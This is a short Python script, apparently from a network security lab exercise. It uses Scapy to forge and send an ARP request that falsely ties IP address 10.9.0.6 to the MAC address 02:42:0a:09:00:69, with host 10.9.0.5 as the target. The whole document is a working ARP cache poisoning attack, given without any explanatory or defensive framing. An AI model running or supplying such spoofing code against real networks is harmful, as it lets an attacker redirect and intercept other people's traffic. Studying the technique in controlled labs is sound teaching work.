#!/usr/bin/env python3
from scapy.all import *

E = Ether()
A = ARP(hwsrc="02:42:0a:09:00:69", psrc="10.9.0.6" ,hwdst="02:42:0a:09:00:05", pdst="10.9.0.5")
A.op = 1 # 1 for ARP request; 2 for ARP reply
#A.psrc = "10.0.2.1"
#A.pdst = "10.0.2.3"

pkt = E/A
sendp(pkt)
